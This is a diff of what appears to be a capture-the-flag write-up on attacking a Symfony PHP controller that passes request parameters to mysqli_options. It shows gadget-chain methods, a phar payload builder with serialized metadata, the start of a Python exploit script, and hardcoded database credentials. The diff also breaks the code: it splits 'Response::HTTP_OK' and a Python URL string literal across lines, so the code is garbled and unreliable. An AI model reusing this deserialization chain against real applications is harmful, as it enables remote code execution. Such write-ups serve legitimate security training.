@@ -47,11 +47,6 @@
 40
 41
 42
-```
-
-
-
-```
 <?php
 
 namespace App\Controller;
@@ -75,7 +70,7 @@ class TestController extends AbstractController
  if (is_numeric($key) && is_string($value)) {
  mysqli_options($con, $key, $value);
  }
- 
+
  mysqli_options($con, MYSQLI_OPT_LOCAL_INFILE, 0);
  if (!mysqli_real_connect($con, "127.0.0.1", "ctf", "gmlsec123456", "mysql")) {
  $content = '数据库连接失败';
@@ -87,60 +82,36 @@ class TestController extends AbstractController
 
  return new Response(
  $content,
- Response::HTTP_OK,
+ Response::
+HTTP_OK,
  ['content-type' => 'text/html']
  );
  }
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 ~  php -a
 Interactive shell
 
 php > echo MYSQLI_INIT_COMMAND;
 3
 php >
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 public function __call(string $method, array $args)
 {
  $this->ready ?: $this->ready = $this->initializer->__invoke($this->redis);
 
  return $this->redis->{$method}(...$args);
 }
-```
-
-
-
-```
 1
 2
 3
@@ -152,11 +123,6 @@ public function __call(string $method, array $args)
 9
 10
 11
-```
-
-
-
-```
 /** @param string|AbstractAsset $assetName */
 public function __invoke($assetName): bool
 {
@@ -168,47 +134,22 @@ public function __invoke($assetName): bool
 
  return true;
 }
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 public function __invoke($var): string
 {
  return ($this->handler)($var);
 }
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 public function __destruct()
 {
  $this->commit();
 }
-```
-
-
-
-```
 1
 2
 3
@@ -273,11 +214,6 @@ public function __destruct()
 62
 63
 64
-```
-
-
-
-```
 <?php
 
 //namespace Doctrine\Bundle\DoctrineBundle\Dbal {
@@ -340,11 +276,6 @@ namespace {
  $phar->setMetadata($a);
  $phar->stopBuffering();
 }
-```
-
-
-
-```
 1
 2
 3
@@ -401,14 +332,10 @@ namespace {
 54
 55
 56
-```
-
-
-
-```
 import requests, string, random, os, time
 
-url = "http://127.0.0.1:7001"
+url = "http://127.0.0.1:
+7001"
 
 def req(key, value):
  resp = requests.get(url + "/index.php/test", params={'key': key, 'value': value})
